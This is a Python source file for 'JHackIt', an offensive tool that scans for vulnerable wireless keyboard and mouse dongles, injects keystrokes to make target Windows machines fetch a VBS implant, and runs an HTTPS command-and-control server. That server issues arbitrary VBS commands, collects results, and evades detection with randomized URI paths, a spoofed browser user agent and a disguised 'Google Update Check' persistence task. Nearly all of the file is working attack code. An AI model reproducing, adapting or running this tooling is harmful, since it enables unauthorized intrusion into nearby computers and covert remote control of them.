#!/usr/bin/env python3
import argparse
import array
import collections
import datetime
import json
import os
import random
import re
import socket 
import socketserver
import ssl
import string
import sys
import threading
import time
import uuid

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import jackit
from jackit import duckyparser
from jackit import mousejack
from jackit import plugins

LogBasePath = os.path.join(os.getcwd(), "logs") 
LocalListeningHost = "0.0.0.0"
LocalListeningPort = 443

ListeningServerName = "<callback_address>"
ListeningServerPort = 443

SslEnabled = True
SslKeyfile="keyfile.key"
SslCertfile="certfile.crt"

# OpenSSL command to generate a self-signed cert for SSL:
# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout keyfile.key -out certfile.crt

# A unique User-Agent used as a test for against forensic probing
ClientUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.1O2 Safari/537.36"

FirstStagePayload = "VbsClientStage1.duck"
SecondStagePayload = "VbsClientStage2_dynamic.vbs"

GlobalSecondStageTaskingPath = "./Tasking/GlobalSecondStageTasking.txt"
GlobalThirdStageTaskingPath = "./Tasking/GlobalThirdStageTasking.txt"

UUID_Replace_String = "<client_uuid_00000000-0000-0000-0000-000000000000>"
ServerName_Replace_String = "<server_host_name_example.com>"
Port_Replace_String = "<server_port_443>"
SSL_Replace_String = "<SSL_enabled_value_true/false>"
MinWait_Replace_String = "<min_wait_5000>"
MaxWait_Replace_String = "<max_wait_8000>"
HttpPrefix_Replace_String = "<http_prefix>"
HostAndPort_Replace_String = "<host_and_port>"
UriPath_Replace_String = "<registered_uri_path>"
UserAgent_Replace_String = "<client_user_agent>"

# Initial requests are limited to a 1KB size, until the Content-Length header can be found.
InitialRecvBuffer = 1024

# The total request size is limited to 2^28 bytes (268 MB).
MaxRecvSize = 268435456

CurrentTaskingId = 1

# Regular expression for finding the Content-Length header.
ContentLengthRe = re.compile("Content-Length:\s+(?P<ContentLength>\d+)")

# Regular expression for finding the ClientId value.
UuidHeaderRe = re.compile("_user: (?P<ClientId>[a-zA-Z0-9]{8}-([a-zA-Z0-9]{4}-){3}[a-zA-Z0-9]{12})")

# Regular expression for finding the client stage level.
StageHeaderRe = re.compile("_x: (?P<StageLevel>\d+)")

# Regular expression for finding the client's number of attempted callbacks.
CallbackCountRe = re.compile("_y: (?P<CallbackCount>\d+)")

# Regular expression for finding the client user-agent string.
UserAgentRe = re.compile("User-Agent:\s+(?P<UserAgent>.+?)\n")

# Regular expression for finding the requested path value.
UriPathRe = re.compile("(POST|GET) (?P<path>.+?) (HTTP/1\.1)")

__version__ = 1.01

attack_log_path = "jhackit_attack_log.json"


# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

TopPaths = []
TopExtensions = []
with open("dirbuster-top1000.txt", "r") as f:
    TopPaths = f.readlines()
with open("randomExtensions.txt", "r") as f:
    TopExtensions = f.readlines()

# Dictionary mapping client ID's to their individual tasking queues
Clients = {}

# Global tasking counter
CurrentTaskingId = 1

# Dictionary mapping URI paths registered to a specific client ID.
RegisteredPaths = {}

ScheduledTaskName = "Google Update Check"

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('--debug', help='Enable debug.', action='store_true')
parser.add_argument('--lowpower', help='Disable the Low Noise Amplifier (LNA) on Crazyradio dongles.', action='store_true')
parser.add_argument('--interval', type=int, default=5, help='Interval of scan in seconds, default to 5 seconds.')
parser.add_argument('--layout', default='us', choices=['be','br','ca','ch','de','dk','es','fi','fr','gb','hr','it','no','pt','ru','si','sv','tr','us'], help='Keyboard layout: us, gb, de...')
parser.add_argument('--address', default='', help='Address of device to target attack.')
parser.add_argument('--no-reset', help='Reset CrazyPA dongle prior to initalization.', action='store_true')
parser.add_argument('--keep-attacking', help='Keep attacking any previously attacked hosts.', action='store_true')
parser.add_argument('--whitelist-path', default="", help="White-list of specific devices to attack.")
parser.add_argument('--blacklist-path', default="", help="Black-list of specific devices to skip attacking.")
parser.add_argument('--scan', help="Scan for devices, ping them, but skip attack.", action='store_true')

class ComplexJSONEncoder(json.JSONEncoder):
    def default(self, o):
        if type(o) == type(jackit.plugins.logitech.HID):
            return 'Logitech'

        elif type(o) == type(jackit.plugins.microsoft.HID):
            return 'Microsoft'

        elif type(o) == type(jackit.plugins.amazon.HID):
            return 'Amazon'
        
        elif type(o) == type(jackit.plugins.microsoft_enc.HID):
            return 'Microsoft (Encrypted)'

        #elif str(type(o)) == "<type, 'dictproxy'>":
            #return json.JSONEncoder.default(self, dict(o))
            
        #elif isinstance(o, complex):
            #return [o.real, o.imag]

        #elif isinstance(o, type):
            #return [o.real, o.imag]
        
        elif isinstance(o, array.array):
            return list(iter(o))
        
        elif isinstance(o, datetime.datetime):
            return str(o)
        
        try:
            return json.JSONEncoder.default(self,o)
        
        except TypeError:
            return str(type(o))


def read_attack_log(log_path):
    try:
        if os.path.isfile(log_path):
            with open(log_path, 'r') as f:
                return json.load(f)
        else:
            return {}
    except:
        pass


def update_attack_log(log_path, attack_log):
    try:
        if attack_log:
            with open(log_path, 'w') as f:
                f.write(json.dumps(attack_log, cls=ComplexJSONEncoder, sort_keys=True, indent=4))
    except:
        pass


def get_timestamp():
    return datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
  
  
def get_days_from_now(NumberOfDays=30):
    return (datetime.datetime.utcnow()+datetime.timedelta(days=NumberOfDays)).strftime('%m-%d-%Y')


def get_minutes_from_now(NumberOfMinutes=5):
    return (datetime.datetime.now()+datetime.timedelta(minutes=NumberOfMinutes)).strftime('%H:%m')


def get_log_line(LogLine, ClientId = ""):
    if ClientId == "":
        return "{} -- {}".format(get_timestamp(), LogLine)
    else:
        return "[{}] {} -- {}".format(ClientId, get_timestamp(), LogLine)


def get_second_stage_tasking_files():
    try:
        with open(GlobalSecondStageTaskingPath, 'r') as f:
            return list(map(lambda x: x.strip(), f.readlines()))
    except:
        return []


def get_random_uri_path():
    pathCandidate = ""
    while pathCandidate in RegisteredPaths or pathCandidate == "":
        pathCandidate = random.choice(TopPaths).strip()
        if "." not in pathCandidate.split("/")[-1]:
            if not pathCandidate.endswith("/"):
                pathCandidate = "{}/".format(pathCandidate)
            pathCandidate = "{}{}.{}".format(pathCandidate, ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=random.randint(1,16))), random.choice(TopExtensions).strip())
    return pathCandidate


def log_string(LogLine, ClientId = "", DoPrint = True):
    LogFilePath = os.path.join(LogBasePath, ClientId + ".log")
    if ClientId == "":
        LogFilePath = os.path.join(LogBasePath, "Server.log")
    FormattedLogLine = get_log_line(LogLine, ClientId)
    with open(LogFilePath, 'a') as f:
        f.write(FormattedLogLine + "\n")
    if DoPrint:
        print(FormattedLogLine)


def register_uri_path(ClientId, path=""):
    global RegisteredPaths
    if not path or path == "":
        path = get_random_uri_path()
    RegisteredPaths[path] = ClientId
    return path
    
    
def unregister_uri_path(path=""):
    global RegisteredPaths
    if not path or path == "":
        return
    if path in RegisteredPaths:
        del RegisteredPaths[path]


def do_attack(jack, addr_string, target, attack_log, scan_only=False, layout="us", attack="", use_ping=True):
    payload = target['payload']
    channels = target['channels']
    address = target['address']
    hid = target['device']
    
    if addr_string not in attack_log:
        attack_log[addr_string] = {}
        attack_log[addr_string]['address'] = address
        attack_log[addr_string]['locked_channel'] = False
        attack_log[addr_string]['pinged'] = False 
        attack_log[addr_string]['attacked'] = False 
        attack_log[addr_string]['no_hid'] = False 
        attack_log[addr_string]['attack_successful'] = False 
        attack_log[addr_string]['ping_successful'] = False 
        attack_log[addr_string]['last_attacked'] = datetime.datetime.min
        attack_log[addr_string]['last_pinged'] = datetime.datetime.min
        attack_log[addr_string]['last_successful_attack'] = datetime.datetime.min
        attack_log[addr_string]['last_successful_ping'] = datetime.datetime.min

    attack_log[addr_string]['channels'] = channels
    attack_log[addr_string]['last_seen'] = datetime.datetime.fromtimestamp(target['timestamp'])
    
    # Sniffer mode allows us to spoof the address
    jack.sniffer_mode(address)

    if not hid:
        if not attack_log[addr_string]['no_hid']:
            print(R + '[-] ' + W + "Target %s is not injectable. Temporarily skipping..." % (addr_string))
        attack_log[addr_string]['no_hid'] = True
        return
   
    attack_log[addr_string]['no_hid'] = False 
    attack_log[addr_string]['description'] = hid.description()
    
    # Attempt to ping the devices to find the current channel
    lock_channel = False
    if use_ping:
        attack_log[addr_string]['pinged'] = True 
        attack_log[addr_string]['last_pinged'] = datetime.datetime.now()
        lock_channel = jack.find_channel(address)
    attack_log[addr_string]['locked_channel'] = lock_channel

    if lock_channel:
        print("[!] Attacking {}...".format(addr_string))
        attack_log[addr_string]['ping_successful'] = True 
        attack_log[addr_string]['last_successful_ping'] = attack_log[addr_string]['last_pinged']
        print(G + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
        
        NewClient = Client(device_address=address)
        
        try:
            parser = duckyparser.DuckyParser(NewClient.get_first_stage(), layout=layout.lower())
        except Exception as ex:
            print("[-] Exception encountered while parsing the first-stage duck script.")
            print(ex)
            return
        attack = parser.parse()

        if attack == "":
            print("[-] No attack payload given; returning.")
            return
        
        if not scan_only:
            print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), lock_channel))
            jack.attack(hid(address, payload), attack)
        attack_log[addr_string]['attacked'] = True


def scan_loop(jack, interval, address=None):
    last_device_count = len(jack.devices)

    if address and address.strip() != "":
        jack.sniff(interval, address)
    else:
        jack.scan(interval)
    
    for addr_string, device in jack.devices.items():
        if device['device']:
            device_name = device['device'].description()
        else:
            device_name = 'Unknown'
    
    if len(jack.devices) > last_device_count:
        print("[+] Saw +{} device(s) [{} total]".format(len(jack.devices)-last_device_count, len(jack.devices)))
    
    
class Tasking:
    def __init__(self, from_string=None, from_path=None, next_path=None, raw=False, *args, **kwargs):
        global CurrentTaskingId
        self.id = CurrentTaskingId
        self.is_valid = False
        CurrentTaskingId += 1
        self.raw = raw
        self.next_path = next_path
        self.results = None
        self.tasking_path = from_path
        self.script = from_string
        self.validate_tasking()
    
    def get_string(self):
        if self.raw:
            return self.script
        elif self.is_valid and len(self.script.strip()) > 0:
            if self.next_path and len(self.script.strip()) > 0:
                return "<EXECVBS><VBS:{}>".format("{}\r\nRequestPath = \"{}\"\r\n".format(self.script, self.next_path))
            else:
                return "<EXECVBS><VBS:{}>".format(self.script)
        elif self.next_path and len(self.next_path.strip()) > 0:
            return "<EXECVBS><VBS:RequestPath = \"{}\">".format(self.next_path)

    def get_results(self):
        if self.results:
            ResultsString = ("[+] Successfully ran command: {}\n".format(self.id))
            ResultsString += ("[+] Results:\n\t{}\n".format(self.results))
            return ResultsString
        
    def validate_tasking(self):
        self.is_valid = False
        if self.tasking_path:
            if len(self.tasking_path.strip()) == 0 or not os.path.isfile(self.tasking_path):
                return
            try:
                with open(self.tasking_path, 'r') as f:
                    self.script = f.read()
            except:
                return
        if not self.script or len(self.script.strip()) == 0:
            return
        self.is_valid = True


class Client:
    def __init__(self, id=None, stage=0, initial_path=None, device_address=None):
        global Clients
        self.connections = 0
        self.device_address = device_address
        
        self.id = id
        if self.id is None:
            self.id = str(uuid.uuid4())
            
        self.ip_address = ""
        
        self.initial_path = register_uri_path(self.id, initial_path)
        
        self.max_wait = 8000
        self.min_wait = 5000
        self.port = 0
        self.remote_connection_count = 0
        self.server_address = ListeningServerName
        self.server_port = ListeningServerPort
        self.sent_tasking = []
        self.ssl_enabled = SslEnabled
        self.stage = stage
        self.tasking = collections.deque([])
        
        Clients[self.id] = self
        
    
    # Add tasking to the Client's tasking deque. Default action is to append new tasking to the end.
    # Set 'push' to True to append the tasking to the front of the deque.
    def add_tasking(self, task, push=False, path=""):
        if push:
            self.tasking.extendleft([task])
        else:
            self.tasking.extend([task])


    # Pop the next Tasking object from the tasking queue, adding the next_path, if necessary.
    def get_tasking(self):
        try:
            CurrentTasking = self.tasking.popleft()
            if not CurrentTasking.next_path:
                CurrentTasking.next_path = register_uri_path(self.id)
            return CurrentTasking
        except:
            return Tasking(next_path=register_uri_path(self.id))


    def get_first_stage(self):
        Payload = ""
        try:
            with open(FirstStagePayload, "r") as f:
                Payload = f.read()
        except:
            return
        if self.ssl_enabled:
            Payload = Payload.replace(HttpPrefix_Replace_String, "https")
        else:
            Payload = Payload.replace(HttpPrefix_Replace_String, "http")
        if (self.ssl_enabled and ListeningServerPort == "443") or (not self.ssl_enabled and ListeningServerPort == "80"):
            Payload = Payload.replace(HostAndPort_Replace_String, ListeningServerName)
        else:
            Payload = Payload.replace(HostAndPort_Replace_String, "{}:{}".format(ListeningServerName, ListeningServerPort))
        Payload = Payload.replace(UriPath_Replace_String, self.initial_path)
        print("[+] Generated first-stage payload for {}".format(self.id))
        
        #with open((os.path.join(LogBasePath,"first_stage_payload.duck")), "w") as f:
        #    f.write(Payload)
        #print("[+] Generated first-stage duck payload: {}".format((os.path.join(LogBasePath,"first_stage_payload.duck"))))
        
        return Payload
        
        
    def get_second_stage(self):
        Payload = ""
        try:
            with open(SecondStagePayload, "r") as f:
                Payload = f.read()
        except:
            return
            
        Payload = Payload.replace(UUID_Replace_String, self.id)
        Payload = Payload.replace(ServerName_Replace_String, ListeningServerName)
        Payload = Payload.replace(Port_Replace_String, str(LocalListeningPort))
        Payload = Payload.replace(MinWait_Replace_String, str(self.min_wait))
        Payload = Payload.replace(MaxWait_Replace_String, str(self.max_wait))
        Payload = Payload.replace(UriPath_Replace_String, self.initial_path)
        Payload = Payload.replace(UserAgent_Replace_String, ClientUserAgent)

        if self.ssl_enabled:
            Payload = Payload.replace(HttpPrefix_Replace_String, "https")
        else:
            Payload = Payload.replace(HttpPrefix_Replace_String, "http")
        print("[+] Generated second-stage payload for {}".format(self.id))
            
        #with open((os.path.join(LogBasePath,"second_stage_payload.vbs")), "w") as f:
        #    f.write(Payload)
        #print("[+] Generated second-stage payload: {}".format((os.path.join(LogBasePath,"second_stage_payload.vbs"))))
        
        return Payload


    def register_callback(self, path, data=""):
        StageMatch = StageHeaderRe.search(data)
        try:
            if StageMatch:
                self.stage = int(StageMatch.group("StageLevel"))
        except:
            pass
            
        CallbackCountMatch = CallbackCountRe.search(data)
        try:
            if CallbackCountMatch:
                self.remote_connection_count = int(CallbackCountMatch.group("CallbackCount"))
        except:
            pass        
        
        # If the requested callback path is this client's initial callback path, this means the
        # client script has just started and is calling back for the first time, since starting.
        if path.startswith(self.initial_path):
        
            # It could either be a second-stage client, calling back for its first tasking
            if UuidHeaderRe.search(data) and self.stage <= 2:
                log_string("[+] First connection from second-stage client {}:{}".format(self.ip_address, self.port), self.id)
                self.stage = 2
                for SecondStagePath in get_second_stage_tasking_files():
                    self.add_tasking(Tasking(from_path=SecondStagePath))
                
            # Or a first-stage client, calling back for the second stage.
            elif self.stage == 0:
                log_string("[+] First connection from first-stage client {}:{}".format(self.ip_address, self.port), self.id)
                self.stage = 1
                self.task_second_stage(push=True)
                
            # Depending on whether or not a client ID was a parameter in the HTTP request.
            
        else:
            # If this was a POST, store the results in the tasking with the correct path.
            if data.strip().startswith("POST"):
                for completed_task in filter(lambda x: x.next_path == path.split("?")[0], self.sent_tasking):
                    completed_task.results = data
                    log_string(completed_task.get_results(), self.id)
            
            # Unregister the path to detect and prevent any replay attacks.
            unregister_uri_path(path.split("?")[0])
            
            # Do second-stage things here:
            if self.stage == 2:
                log_string("[+] Connection from second-stage client {}:{}".format(self.ip_address, self.port), self.id)
                if len(self.tasking) == 0:
                    log_string("[!] Tasking deque empty. Tasking install for second-stage client {}:{}...".format(self.ip_address, self.port), self.id)
                    #self.TaskInstall(push=True)
            
            # Do third-stage things here:
            elif self.stage == 3:
                log_string("[+] Connection from third-stage client {}:{}".format(self.ip_address, self.port), self.id)

        self.connections += 1
        
        
    def terminate(self, push=False):
        log_string("[!] Tasking remote client termination.", self.id)
        self.add_tasking(Tasking(from_string="Break = True"), push)
    
    
    def set_uuid(self, uuid="", push=False):
        if uuid != "":
            self.id = uuid
        log_string("[!] Tasking SETUUID on client.", self.id)
        self.add_tasking(Tasking(from_string=("UUID = \"{}\"".format(self.id))), push)
    
    
    def set_callback(self, interval=8000, range=5000):
        self.min_wait = interval - range
        self.max_wait = interval + range
        if self.min_wait < 0:
            self.min_wait = 0
        if self.max_wait < 0:
            self.max_wait = 0
        if self.max_wait <= self.min_wait:
            self.max_wait += 1000
        log_string("[!] Tasking SETCALLBACK({}, {}) on client.".format(interval, range), self.id)
        self.add_tasking(Tasking(from_string=("MinWait = \"{}\"\r\nMaxWait = \"{}\"".format(self.min_wait, self.max_wait))), push)
    
    
    def set_callback_host(self, host="", port="", push=False):
        if host == "":
            host = ListeningServerName
        if port == "":
            port = ListeningServerPort
        log_string("[!] Tasking SETCALLBACKHOST({}, {}) on client.".format(host, port), self.id)
        self.add_tasking(Tasking(from_string=("Server = \"{}\"\r\Port = \"{}\"".format(host, port))), push)
        
        
    def exec_vbs(self, vbs="", push=False):
        if vbs == "":
            return
        log_string("[!] Tasking EXECVBS(<{} char>) on client.".format(len(vbs)), self.id)
        self.add_tasking(Tasking(from_string=vbs), push)
    
    
    def task_second_stage(self, withcheck=False, push=False):
        if self.stage >= 2:
            return
        log_string("[!] Tasking second-stage on client.", self.id)
        unregister_uri_path(self.initial_path)
        self.initial_path = register_uri_path(self.id)
        commandString = "{}"
        if withcheck:
            commandString = "CC:{}"
        self.add_tasking(Tasking(from_string=commandString.format(self.get_second_stage()), raw=True), push)


    #def TaskInstall(self, remotepath="", push=False):
    #    if not remotepath or remotepath == "":
    #        return
    #    if push:
    #        self.add_tasking(Tasking(command="EXIT"), push)
    #    self.add_tasking(Tasking(command="SILENTCMD", CMD=("SchTasks /Create /SC MINUTE /MO 15 /K /ED {} /Z /F /TN \"{}\" /TR \"{}\" /ST {}".format(get_days_from_now(30), ScheduledTaskName, remotepath, get_minutes_from_now(15)))), push)
    #    if not push:
    #        self.add_tasking(Tasking(command="EXIT"), push)


class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        global Clients
        ClientId = ""
        ClientIdFromMatch = None
        ClientIdFromPath = None
        
        # Receive the first 1024 bytes of the initial connection.
        self.data = str(self.request.recv(InitialRecvBuffer), "utf-8")
        SourceAddress, SourcePort = self.request.getpeername()
        
        # If no data was received, do not respond to whatever this connection is.
        if len(self.data) == 0:
            return
        
        UriPathMatch = UriPathRe.search(self.data)
        if not UriPathMatch:
            return
        RequestedPath = UriPathMatch.group("path")
        
        # Get the ClientId from the request path.
        ClientIdMatch = UuidHeaderRe.search(self.data)
        
        if ClientIdMatch:
            ClientIdFromMatch = ClientIdMatch.group("ClientId")
            
        if RequestedPath.split("?")[0] in RegisteredPaths:
            ClientIdFromPath = RegisteredPaths[RequestedPath.split("?")[0]]
        else:
            log_string("[!] Warning: Path not registered for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return
        
        if ClientIdFromMatch and ClientIdFromPath and ClientIdFromPath != ClientIdFromMatch:
            log_string("[!] Imposter detected: {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return
        
        if ClientIdFromMatch and ClientIdFromMatch in Clients:
            ClientId = ClientIdFromMatch
        elif ClientIdFromPath and ClientIdFromPath in Clients:
            ClientId = ClientIdFromPath
        else:
            log_string("[!] Connection from unknown client {}:{} at {}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return

        CurrentClient = Clients[ClientId]
        
        if CurrentClient.remote_connection_count > 0 and RequestedPath.startswith(CurrentClient.initialpath):
            log_string("[!] Warning: Potential replay detected for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return
            
        UserAgentMatch = UserAgentRe.search(self.data)
        
        if CurrentClient.remote_connection_count > 0 and (not UserAgentMatch or UserAgentMatch.group("UserAgent").strip() != ClientUserAgent.strip()):
            log_string("[!] User-Agent does not match expected value for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return
        
        CurrentClient.ipaddress = SourceAddress
        CurrentClient.port = SourcePort
        
        log_string("[!] Connection from known client {}:{} => {}".format(SourceAddress, SourcePort, CurrentClient.id), "", False)
        
        # Look for the Content-Length header to figure out how much data to receive.
        ContentLengthMatch = ContentLengthRe.search(self.data)
        
        # If the header was found, consider receiving any unreceived bytes.
        if ContentLengthMatch:
            try:
                # If content-length implies there is more data to receive, though less data than the maximum allowable size, try to receive it.
                if int(ContentLengthMatch.group("ContentLength")) + len(self.data) > 0 and int(ContentLengthMatch.group("ContentLength")) + len(self.data) <= MaxRecvSize:
                    #log_string("[*] Request Content-Length larger than InitialRecvBuffer - Receiving remaining data...", ClientId)
                    
                    # It may be possible to DoS this server, given the remote host has control over the Content-Length header.
                    # Making requests with large Content-Length header values but small data may lead to resource mismanagement;
                    # Documentation unclear...
                    self.data += str(self.request.recv(int(ContentLengthMatch.group("ContentLength"))), "utf-8")
            except:
                log_string("[-] Unable to find, parse, and validate Content-Length field in request - abandoning connection.", ClientId)
                return
        
        CurrentClient.register_callback(RequestedPath, data=self.data)
        
        #print(self.data)
        
        # Each GET is a GET for tasking. Each POST is a response to executed tasking.
        if self.data.strip().startswith("GET") or self.data.strip().startswith("POST"):
            CurrentTasking = CurrentClient.get_tasking()
            Command = CurrentTasking.get_string()
            if self.data.strip().startswith("POST"):
                log_string("[+] Received POST from {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), CurrentClient.id, True)
            else:
                log_string("[+] Received GET from {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), CurrentClient.id, True)
            
            # If no Command has been specified, do nothing; this should never happen
            if Command == "":
                return
                
            # Try to send the formatted Command to the client.
            try:
                self.request.sendall((b"HTTP/1.1 200\ncontent-length: " + str(len(Command.encode("UTF-8"))).encode("UTF-8") + b"\n\n" + Command.encode("UTF-8")))
                CurrentClient.sent_tasking.append(CurrentTasking)
                log_string("[+] Client picked up tasking.", ClientId)
            except:
                log_string("[!] Encountered exception while tasking client.", ClientId)


class ThreadedTcpSslServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def server_bind(self):
        socketserver.TCPServer.server_bind(self)
        self.socket = ssl.wrap_socket(self.socket, keyfile=SslKeyfile, certfile=SslCertfile, ssl_version=ssl.PROTOCOL_TLS_SERVER, server_side=True, do_handshake_on_connect=False)
    
    def get_request(self):
        (socket, addr) = socketserver.TCPServer.get_request(self)
        socket.do_handshake()
        #print(socket.cipher())
        return (socket, addr)
    pass     


class ThreadedTcpServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass


def launch():
    args = parser.parse_args()
    
    print("JHackIt Version %0.2f -- Forrest" % __version__)
    
    # Read in the attack log to track devices.
    attack_log = read_attack_log(attack_log_path)
    
    # Check if user is root; exit if not.
    if os.getuid() != 0:
        print(R+'[!] '+W+"ERROR: You need to run as root!")
        exit(-1)
        
    # Check for the Crazyradio PA dongle with custom mousejack firmware; exit if not present.
    try:
        jack = mousejack.MouseJack(args.lowpower, args.debug, (not args.no_reset))
    except Exception as e:
        print(R+'[!] '+W+"Exception encountered while finding or could not find Crazyradio PA USB dongle with Mousejack firmware.")
        exit(-1)
    
    print("[!] Starting local tasking server. Use CTRL-C to initiate shutdown.")
    
    # Create a new threaded server.
    if SslEnabled:
        server = ThreadedTcpSslServer((LocalListeningHost, LocalListeningPort), ThreadedTCPRequestHandler)
    else:
        server = ThreadedTcpServer((LocalListeningHost, LocalListeningPort), ThreadedTCPRequestHandler)
        
    ip, port = server.server_address
    
    # Start the server's thread, which will start threads for each new connection.
    server_thread = threading.Thread(target=server.serve_forever)
    
    # Exit the server thread when the main thread terminates.
    server_thread.daemon = True
    server_thread.start()
    
    print("[*] Started server listening on {}:{} ({})".format(ip, port, server_thread.name))
    
    whitelist = []
    if args.whitelist_path and os.path.isfile(args.whitelist_path):
        with open(args.whitelist_path, "r") as f:
            whitelist = list(map(lambda x: x.strip().upper(), filter(lambda y: y.strip() != "", f.readlines())))
        if len(whitelist) > 0:
            print(O+"[!] "+W+("Using a whitelist consisting of {} device(s)...".format(len(whitelist))))

    blacklist = []
    if args.blacklist_path and os.path.isfile(args.blacklist_path):
        with open(args.blacklist_path, "r") as f:
            blacklist = list(map(lambda x: x.strip().upper(), filter(lambda y: y.strip() != "", f.readlines())))
        if len(blacklist) > 0:
            print(O+"[!] "+W+("Using a blacklist consisting of {} device(s)...".format(len(blacklist))))
    
    if args.address and args.address.strip() != "":
        print(GR+"[+] "+W+("Scanning for %s every %ds " % (args.address, args.interval))+G+"CTRL-C "+W+"when done.\n")
    else:
        print(GR+"[+] "+W+("Scanning every %ds " % args.interval)+G+"CTRL-C "+W+"when done.\n")
    
    try:
        while True:
            scan_loop(jack, args.interval, args.address)
            for addr_string, device in jack.devices.items():
                # If a whitelist was used, don't attack anything not in the whitelist.
                # If a blacklist was used, don't attack anything in the blacklist.
                if (len(whitelist) > 0 and addr_string not in whitelist) or (len(blacklist) > 0 and addr_string in blacklist):
                    continue

                # Only attack things that haven't been attacked, unless keep-attacking was specified
                if addr_string not in attack_log or not attack_log[addr_string]['attacked'] or args.keep_attacking:
                    do_attack(jack, addr_string, device, attack_log, scan_only=args.scan, layout=args.layout)
                    update_attack_log(attack_log_path, attack_log)

    except KeyboardInterrupt:
        print('[-] Quitting' + W)

    with open('jhackit.out', 'w') as f:
        f.write(json.dumps(jack.devices, cls=ComplexJSONEncoder, skipkeys=True, sort_keys=True, indent=4))

    update_attack_log(attack_log_path, attack_log)

    print("[*] Cleaning up local server...")
    server.shutdown()
    server.server_close()
    print("[+] Done.\r\n")
    
    pinged_devices = 0
    hidless_devices = 0
    total_devices = len(attack_log)
    for addr_string, device in attack_log.items():
        if device['attacked']:
            pinged_devices += 1
        if device['no_hid']:
            hidless_devices += 1

    print("Pinged Devices:  {}".format(pinged_devices))
    print("Hidless Devices: {}".format(hidless_devices))
    print("Total Devices:   {}".format(total_devices))

if __name__ == "__main__":
    launch()
